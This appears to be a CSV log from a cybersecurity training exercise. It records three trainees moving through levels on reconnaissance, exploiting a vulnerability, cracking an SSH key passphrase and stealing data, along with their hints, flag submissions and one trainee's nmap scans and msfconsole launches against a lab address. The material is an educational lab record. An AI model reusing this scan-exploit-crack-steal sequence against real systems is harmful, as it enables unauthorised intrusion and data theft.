trainee,level,timestamp,event_type,event,game_param,cmd_param,event_detail
1,39,14.5.2020 10:03:27,game,LevelStarted,39,,INFO: Storyline
1,40,14.5.2020 10:04:51,game,LevelStarted,40,,GAME: Reconnaissance
1,40,14.5.2020 10:15:20,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
1,40,14.5.2020 10:22:11,game,CorrectFlagSubmitted,,,
1,41,14.5.2020 10:22:11,game,LevelStarted,41,,GAME: Exploiting vulnerability
1,41,14.5.2020 10:36:05,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
1,41,14.5.2020 10:51:34,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
1,41,14.5.2020 10:59:08,game,SolutionDisplayed,,,
1,41,14.5.2020 11:02:36,game,CorrectFlagSubmitted,,,
1,41,14.5.2020 11:02:37,game,SolutionDisplayed,,,
1,42,14.5.2020 11:02:37,game,LevelStarted,42,,GAME: Looking for something useful
1,42,14.5.2020 11:03:20,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
1,42,14.5.2020 11:09:32,game,WrongFlagSubmitted,keys,,
1,42,14.5.2020 11:09:43,game,CorrectFlagSubmitted,,,
1,43,14.5.2020 11:09:44,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
1,43,14.5.2020 11:18:52,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
1,43,14.5.2020 11:50:42,game,WrongFlagSubmitted,1g,,
1,43,14.5.2020 11:51:08,game,CorrectFlagSubmitted,,,
1,44,14.5.2020 11:51:08,game,LevelStarted,44,,GAME: Stealing the data
1,44,14.5.2020 11:59:01,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
1,44,14.5.2020 12:06:18,game,CorrectFlagSubmitted,,,
1,45,14.5.2020 12:06:19,game,LevelStarted,45,,INFO: Ending
1,45,14.5.2020 12:06:39,game,TrainingRunEnded,,,
2,39,14.5.2020 10:02:12,game,LevelStarted,39,,INFO: Storyline
2,40,14.5.2020 10:03:18,game,LevelStarted,40,,GAME: Reconnaissance
2,40,14.5.2020 10:08:09,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
2,40,14.5.2020 10:08:46,game,HintTaken,40-2,,HINT: (40-2) What port to look for?
2,40,14.5.2020 10:13:08,game,CorrectFlagSubmitted,,,
2,41,14.5.2020 10:13:08,game,LevelStarted,41,,GAME: Exploiting vulnerability
2,41,14.5.2020 10:14:14,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
2,41,14.5.2020 10:14:52,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
2,41,14.5.2020 10:28:21,game,SolutionDisplayed,,,
2,41,14.5.2020 10:35:26,game,CorrectFlagSubmitted,,,
2,41,14.5.2020 10:35:26,game,SolutionDisplayed,,,
2,42,14.5.2020 10:35:26,game,LevelStarted,42,,GAME: Looking for something useful
2,42,14.5.2020 10:37:05,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
2,42,14.5.2020 10:37:10,game,HintTaken,42-2,,HINT: (42-2) How to download the file?
2,42,14.5.2020 10:51:41,game,CorrectFlagSubmitted,,,
2,43,14.5.2020 10:51:42,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
2,43,14.5.2020 10:52:59,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
2,43,14.5.2020 10:53:03,game,HintTaken,43-2,,HINT: (43-2) What needs to be done before cracking?
2,43,14.5.2020 11:12:23,game,SolutionDisplayed,,,
2,43,14.5.2020 11:26:19,game,CorrectFlagSubmitted,,,
2,43,14.5.2020 11:26:19,game,SolutionDisplayed,,,
2,44,14.5.2020 11:26:20,game,LevelStarted,44,,GAME: Stealing the data
2,44,14.5.2020 11:29:09,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
2,44,14.5.2020 11:29:13,game,HintTaken,44-2,,HINT: (44-2) In what format addresses are?
2,44,14.5.2020 11:29:19,game,HintTaken,44-3,,HINT: (44-3) Where to look for passwords?
2,44,14.5.2020 11:43:34,game,CorrectFlagSubmitted,,,
2,45,14.5.2020 11:43:34,game,LevelStarted,45,,INFO: Ending
2,45,14.5.2020 11:44:00,game,TrainingRunEnded,,,
3,39,14.5.2020 10:08:58,game,LevelStarted,39,,INFO: Storyline
3,40,14.5.2020 10:10:04,game,LevelStarted,40,,GAME: Reconnaissance
3,40,14.5.2020 10:12:45,game,HintTaken,40-1,,HINT: (40-1) What tool to use??
3,40,14.5.2020 10:32:15,game,CorrectFlagSubmitted,,,
3,41,14.5.2020 10:32:16,game,LevelStarted,41,,GAME: Exploiting vulnerability
3,41,14.5.2020 10:35:29,game,HintTaken,41-1,,HINT: (41-1) What tool to use??
3,41,14.5.2020 10:37:28,game,HintTaken,41-2,,HINT: (41-2) What exploit to use?
3,41,14.5.2020 11:04:36,game,WrongFlagSubmitted,49357,,
3,41,14.5.2020 11:05:01,game,CorrectFlagSubmitted,,,
3,42,14.5.2020 11:05:01,game,LevelStarted,42,,GAME: Looking for something useful
3,42,14.5.2020 11:07:40,game,HintTaken,42-1,,HINT: (42-1) Where to look for such file?
3,42,14.5.2020 11:07:48,game,HintTaken,42-2,,HINT: (42-2) How to download the file?
3,42,14.5.2020 11:25:21,game,WrongFlagSubmitted,.ssh,,
3,42,14.5.2020 11:26:00,game,CorrectFlagSubmitted,,,
3,43,14.5.2020 11:26:00,game,LevelStarted,43,,GAME: Cracking SSH key passphrase
3,43,14.5.2020 11:29:33,game,HintTaken,43-1,,HINT: (43-1) What's the name of the cracking tool?
3,43,14.5.2020 11:29:40,game,HintTaken,43-2,,HINT: (43-2) What needs to be done before cracking?
3,43,14.5.2020 12:09:12,game,CorrectFlagSubmitted,,,
3,44,14.5.2020 12:09:12,game,LevelStarted,44,,GAME: Stealing the data
3,44,14.5.2020 12:16:25,game,HintTaken,44-1,,HINT: (44-1) How to use the key?
3,44,14.5.2020 12:16:29,game,HintTaken,44-2,,HINT: (44-2) In what format addresses are?
3,44,14.5.2020 12:34:37,game,HintTaken,44-3,,HINT: (44-3) Where to look for passwords?
3,44,14.5.2020 12:36:28,game,CorrectFlagSubmitted,,,
3,45,14.5.2020 12:36:29,game,LevelStarted,45,,INFO: Ending
3,45,14.5.2020 12:36:45,game,TrainingRunEnded,,,
1,40,14.5.2020 10:09:30,bash-command,ip,,config,/root
1,40,14.5.2020 10:09:41,bash-command,ipconfig,,,/root
1,40,14.5.2020 10:09:44,bash-command,ip,,help,/root
1,40,14.5.2020 10:09:59,bash-command,ip,,,/root
1,40,14.5.2020 10:11:00,bash-command,ls,,,/root
1,40,14.5.2020 10:12:19,bash-command,connect,,,/root
1,40,14.5.2020 10:16:11,bash-command,nmap,,,/root
1,40,14.5.2020 10:16:58,bash-command,nmap,,-sL,/root
1,40,14.5.2020 10:17:59,bash-command,nmap,,-sL 10.1.26.9:5050,/root
1,40,14.5.2020 10:18:32,bash-command,nmap,,-v -sn 10.1.26.9:5050,/root
1,40,14.5.2020 10:18:44,bash-command,nmap,,-v -sn 10.1.26.9,/root
1,40,14.5.2020 10:19:00,bash-command,nmap,,-sL 10.1.26.9,/root
1,40,14.5.2020 10:20:43,bash-command,nmap,,10.1.26.9,/root
1,41,14.5.2020 10:29:42,bash-command,ip,,localhost:10000,/root
1,41,14.5.2020 10:36:38,bash-command,metasploit,,,/root
1,41,14.5.2020 10:37:28,bash-command,nmap,,10.1.26.9,/root
1,41,14.5.2020 10:39:45,bash-command,nsf,,,/root
1,41,14.5.2020 10:40:47,bash-command,run,,,/root
1,41,14.5.2020 10:40:58,bash-command,use,,,/root
1,41,14.5.2020 10:41:05,bash-command,msf,,,/root
1,41,14.5.2020 10:41:20,bash-command,msf5,,,/root
1,41,14.5.2020 10:43:11,bash-command,msfconsole,,,/root
